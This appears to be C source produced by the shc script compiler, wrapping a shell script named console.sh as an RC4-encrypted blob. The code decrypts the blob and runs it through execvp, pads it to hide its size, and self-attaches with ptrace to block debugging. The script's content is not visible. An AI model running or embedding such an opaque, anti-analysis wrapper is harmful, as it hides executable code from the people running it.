#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	shc -f console.sh 
#endif

static  char data [] = 
#define      chk2_z	19
#define      chk2	((&data[0]))
	"\333\144\210\057\056\007\106\236\264\350\362\213\047\050\144\137"
	"\374\277\176\352"
#define      tst2_z	19
#define      tst2	((&data[24]))
	"\175\247\041\003\155\255\372\250\200\261\046\146\355\234\117\145"
	"\251\350\060\010\212\330\276\216\245"
#define      tst1_z	22
#define      tst1	((&data[50]))
	"\122\337\223\222\313\031\114\340\017\074\213\376\253\337\177\303"
	"\013\164\153\306\361\262\201\122\031\111\001\300"
#define      xecc_z	15
#define      xecc	((&data[75]))
	"\027\351\124\014\253\236\002\127\134\316\055\270\265\046\261\362"
	"\132\322"
#define      inlo_z	3
#define      inlo	((&data[91]))
	"\276\025\101"
#define      lsto_z	1
#define      lsto	((&data[94]))
	"\164"
#define      date_z	1
#define      date	((&data[95]))
	"\113"
#define      msg2_z	19
#define      msg2	((&data[97]))
	"\310\206\302\076\004\352\236\320\252\051\221\301\225\156\166\331"
	"\140\243\071\321\117\003"
#define      chk1_z	22
#define      chk1	((&data[122]))
	"\241\035\305\064\077\111\075\077\376\210\031\023\201\213\177\075"
	"\070\272\310\132\107\214\300\176\171\046\257\221\364\014\024"
#define      rlax_z	1
#define      rlax	((&data[149]))
	"\317"
#define      shll_z	10
#define      shll	((&data[151]))
	"\263\375\310\120\122\023\214\154\105\124\074\257\226"
#define      opts_z	1
#define      opts	((&data[163]))
	"\154"
#define      text_z	1489
#define      text	((&data[357]))
	"\312\114\001\315\272\313\263\133\350\171\217\230\012\204\245\037"
	"\362\311\035\062\063\322\345\342\151\157\301\316\305\106\200\217"
	"\223\201\135\115\115\021\251\065\212\070\316\225\275\163\264\257"
	"\074\322\342\160\244\310\123\016\067\025\334\374\133\135\214\357"
	"\336\352\074\053\373\345\141\206\036\057\034\334\242\320\213\337"
	"\242\156\120\107\066\244\125\156\271\062\153\025\217\367\004\156"
	"\342\100\232\335\046\373\144\104\053\200\041\316\121\255\255\364"
	"\033\376\073\121\242\221\300\134\304\053\161\124\042\165\302\004"
	"\266\135\342\334\130\107\041\204\307\102\122\031\357\000\015\013"
	"\376\111\135\241\333\035\375\237\110\156\363\153\344\266\160\232"
	"\023\123\167\154\232\231\360\142\334\103\173\313\103\211\327\102"
	"\322\064\344\255\121\341\115\231\120\101\005\064\367\165\317\013"
	"\310\254\077\355\376\025\147\165\274\123\234\144\362\026\110\022"
	"\355\316\051\163\341\235\060\264\257\270\064\046\227\113\237\026"
	"\170\061\164\210\040\274\314\363\374\177\261\014\317\342\302\150"
	"\136\347\144\300\341\357\346\004\151\345\337\061\041\212\176\101"
	"\253\132\040\011\332\237\332\053\357\371\251\217\332\106\035\224"
	"\065\246\213\076\024\351\013\331\052\015\311\065\320\311\033\310"
	"\070\172\052\271\325\025\323\226\024\373\164\037\274\032\230\356"
	"\103\105\243\253\012\007\177\323\276\110\263\332\042\141\146\273"
	"\033\331\042\011\016\256\351\076\331\110\036\064\370\272\345\070"
	"\365\034\345\155\120\123\210\342\315\161\147\312\223\171\304\102"
	"\257\263\011\213\162\314\126\227\357\070\074\052\336\364\322\030"
	"\114\105\311\077\160\043\147\177\334\335\334\175\306\140\274\106"
	"\330\045\127\034\261\142\020\130\265\334\113\157\007\027\040\140"
	"\164\226\201\126\074\110\046\102\141\207\235\262\135\266\174\075"
	"\201\314\131\052\301\260\353\242\041\374\062\013\306\371\061\262"
	"\017\175\243\250\275\114\332\053\015\370\312\213\221\344\030\005"
	"\270\227\272\246\066\203\214\277\374\036\366\203\216\021\265\156"
	"\317\340\145\306\226\154\144\015\252\303\072\011\063\235\035\061"
	"\116\302\010\106\251\352\113\216\125\306\100\251\055\026\003\274"
	"\153\344\240\276\366\307\124\317\154\317\243\241\203\271\162\312"
	"\174\060\316\024\332\147\152\075\066\131\312\252\237\024\243\145"
	"\332\125\144\131\224\233\047\032\253\267\275\265\077\006\065\025"
	"\123\331\056\174\361\341\032\351\034\363\274\057\200\245\373\242"
	"\215\332\215\007\152\033\231\160\067\355\045\160\001\271\231\366"
	"\216\054\146\215\207\174\074\020\004\343\111\037\051\333\270\304"
	"\216\140\307\117\140\264\317\252\250\176\133\055\026\360\350\167"
	"\273\133\300\024\320\323\212\036\163\362\220\264\135\371\245\303"
	"\174\213\025\135\270\106\241\100\070\345\061\231\017\252\117\335"
	"\365\005\010\357\162\174\072\134\042\135\361\250\232\071\371\257"
	"\246\106\041\103\061\346\201\126\367\007\356\304\112\003\005\210"
	"\063\105\142\052\134\212\150\066\113\016\143\066\310\150\234\317"
	"\217\250\162\142\313\026\251\101\177\006\317\262\376\323\074\102"
	"\365\062\154\141\267\353\354\052\075\054\017\161\370\157\272\247"
	"\154\257\367\140\227\271\120\174\210\072\173\325\356\001\367\356"
	"\223\021\207\234\002\073\144\116\330\147\247\311\165\264\225\010"
	"\064\113\255\336\247\104\314\103\063\102\233\144\230\015\232\032"
	"\007\204\213\144\256\327\063\207\373\021\334\076\373\266\245\364"
	"\117\027\055\330\220\302\204\107\152\266\217\036\155\170\163\071"
	"\002\320\054\106\033\003\214\250\001\114\050\221\215\264\122\060"
	"\127\045\255\355\160\264\027\150\141\165\327\103\356\037\275\052"
	"\370\142\060\315\073\010\307\245\175\211\126\051\301\001\125\366"
	"\336\143\224\212\053\366\014\104\042\357\151\201\222\224\373\212"
	"\265\103\273\226\047\277\024\021\136\347\146\151\202\236\153\302"
	"\216\041\136\275\107\363\244\051\032\172\255\016\222\256\351\245"
	"\155\021\251\115\137\077\300\204\231\070\111\236\071\243\154\020"
	"\246\040\206\171\206\246\075\263\213\035\031\101\335\362\334\207"
	"\107\310\033\206\116\077\066\125\076\165\241\143\147\306\234\207"
	"\014\214\111\126\361\313\077\156\022\303\003\276\024\337\027\130"
	"\315\027\340\343\262\324\151\117\233\266\035\026\345\060\046\163"
	"\332\046\324\165\114\043\272\062\050\223\310\310\026\235\061\151"
	"\237\200\352\106\111\275\032\120\307\011\361\313\345\266\141\004"
	"\331\015\356\204\370\305\100\145\376\254\304\076\212\221\301\357"
	"\036\011\367\031\002\370\201\330\106\164\117\244\305\172\117\112"
	"\155\233\251\246\034\064\224\205\366\257\134\103\367\012\353\020"
	"\171\255\053\206\325\325\154\323\233\103\246\137\102\216\110\073"
	"\146\325\165\066\357\012\007\307\300\333\357\246\226\013\060\133"
	"\363\116\340\321\052\327\136\164\206\071\300\131\114\125\114\324"
	"\032\240\040\221\014\064\033\141\003\241\116\003\067\035\132\174"
	"\064\042\171\177\211\345\103\120\151\162\174\177\000\004\024\063"
	"\160\033\260\265\022\372\366\055\146\070\177\203\013\233\336\351"
	"\002\052\257\250\051\345\053\053\252\371\301\250\101\364\234\044"
	"\237\162\262\256\307\314\022\175\015\201\115\010\127\327\237\247"
	"\276\235\131\252\233\320\152\250\323\232\154\226\154\265\075\223"
	"\231\175\035\045\304\343\127\146\371\067\240\120\112\276\170\373"
	"\125\366\021\261\050\364\342\067\200\177\272\356\101\164\150\014"
	"\127\051\073\026\377\235\372\147\057\245\140\004\150\057\302\045"
	"\122\257\271\235\051\247\356\256\127\067\246\100\055\322\273\310"
	"\245\251\254\125\166\173\106\132\051\314\316\105\253\326\015\216"
	"\003\152\263\246\045\214\270\200\107\117\234\217\171\315\153\023"
	"\303\073\147\371\115\062\005\031\053\353\063\235\347\344\335\271"
	"\153\065\124\211\274\344\050\270\267\176\027\264\317\376\316\241"
	"\312\024\303\352\315\372\036\126\155\012\170\246\232\137\274\116"
	"\354\353\154\203\167\250\047\130\346\253\132\047\231\163\216\156"
	"\047\033\002\121\006\332\036\115\345\167\020\254\241\054\245\262"
	"\273\116\151\016\337\331\020\342\054\111\074\313\126\200\306\024"
	"\215\345\331\310\264\236\233\010\074\122\045\274\103\260\274\176"
	"\240\125\301\126\255\157\026\271\024\230\006\370\356\027\237\252"
	"\074\000\161\164\243\352\122\070\107\021\000\141\252\243\051\130"
	"\113\265\125\061\064\313\273\014\111\054\156\100\106\257\254\354"
	"\254\053\024\200\042\365\237\172\235\055\123\254\334\020\372\002"
	"\130\142\243\036\074\163\042\126\375\021\000\365\070\056\322\350"
	"\125\111\102\326\265\065\063\306\117\006\136\166\367\275\234\143"
	"\041\207\076\142\220\144\374\315\212\362\177\175\130\066\233\300"
	"\316\311\256\044\320\175\226\002\226\054\335\024\051\122\224\243"
	"\164\127\105\065\145\113\245\131\133\135\167\272\131\216\041\211"
	"\375\347\273\103\066\121\041\367\066\272\022\334\146\152\003\265"
	"\037\062\214\223\315\224\333\265\252\231\146\224\121\357\126\001"
	"\064\275\201\250\203\064\203\345\351\175\144\035\352\204\036\217"
	"\221\376\150\276\211\263\330\152\066\206\132\252\047\015\177\167"
	"\144\030\035\042\303\326\233\231\136\364\212\312\220\302\155\354"
	"\245\316\227\374\254\376\151\364\171\245\322\134\075\237\271\364"
	"\277\341\020\062\210\066\066\122\304\125\214\030\131\070\237\373"
	"\255\371\235\066\356\077\234\223\112\012\150\067\211\256\075\143"
	"\337\167\107\167\142\340\150\305\274\254\100\210\360\311\137\062"
	"\234\223\027\112\345\370\227\177\111\331\204\176\320\371\116\334"
	"\302\225\124\045\165\275\352\061\151\053\271\131\365\031\214\221"
	"\254\243\334\221\234\164\020\345\115\224\144\036\216\262\372\120"
	"\107\117\166\274\014\140\356\165\213\250\317\200\301\133\022\155"
	"\376\356\377\232\142\020\200\257\245\344\315\064\226\310\205\335"
	"\027\373\232\043\133\210\231\346\060\150\147\362\303\172\140\302"
	"\150\140\135\313\160\335\172\025\302\110\112\130\021\317\066\050"
	"\312\320\114\045\131\345\014\212\115\164\175\021\356\335\323\126"
	"\075\060\041\255\016\234\303\320\345\015\051\366\335\137\037\247"
	"\060\153\315\212\120\331\025\236\116\222\260\074\157\203\223\254"
	"\264\265\132\302\122\036\223\067\054\274\056\011\034\115\260\114"
	"\270\176\326\011\127\353\250\245\175\130\342\355\333\165\231\220"
	"\052\364\123\174\022\346\264\077\243\342\110\277\057\371\013\350"
	"\167\342\361\317\316\231\165\114\361\127\071\315\315\323\136\370"
	"\307\261\164\332\230\051\031\073\013\142\373\073\133\007\043\323"
	"\351\025\242\270"
#define      pswd_z	256
#define      pswd	((&data[2109]))
	"\241\157\076\156\074\110\361\154\027\065\230\076\173\060\155\230"
	"\344\230\252\270\123\242\210\247\265\322\032\114\250\344\301\074"
	"\324\216\266\342\327\247\116\356\334\347\055\130\030\233\361\374"
	"\063\233\265\207\076\075\056\364\020\110\101\270\055\002\365\002"
	"\221\254\344\151\124\063\130\061\032\206\211\062\041\173\056\125"
	"\026\343\334\125\041\013\111\061\124\212\352\201\215\340\203\037"
	"\214\150\210\340\233\340\021\265\147\233\350\210\026\026\335\055"
	"\372\272\203\034\306\314\116\032\127\071\234\345\031\040\004\246"
	"\211\215\207\044\156\231\331\325\064\302\135\113\330\073\171\323"
	"\366\374\360\274\310\077\327\040\170\164\005\222\224\011\070\035"
	"\226\277\102\004\130\034\331\215\336\067\331\267\162\122\213\150"
	"\116\173\045\027\272\374\067\062\160\074\304\005\105\375\043\334"
	"\275\145\341\026\201\273\244\140\363\175\027\146\317\242\317\036"
	"\036\364\065\330\361\154\013\141\251\320\147\357\315\212\313\213"
	"\360\255\241\162\150\105\322\134\303\352\302\223\214\221\261\252"
	"\205\346\203\166\123\216\330\374\137\077\354\055\312\267\270\272"
	"\145\132\055\316\237\021"
#define      msg1_z	42
#define      msg1	((&data[2368]))
	"\176\251\355\201\335\074\015\212\247\036\170\115\022\353\067\203"
	"\272\102\036\161\335\266\036\200\327\106\024\144\346\317\321\227"
	"\253\300\046\107\144\305\166\103\255\151\243\303\264\027\323\315"
	"\123\336\060\116\032"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
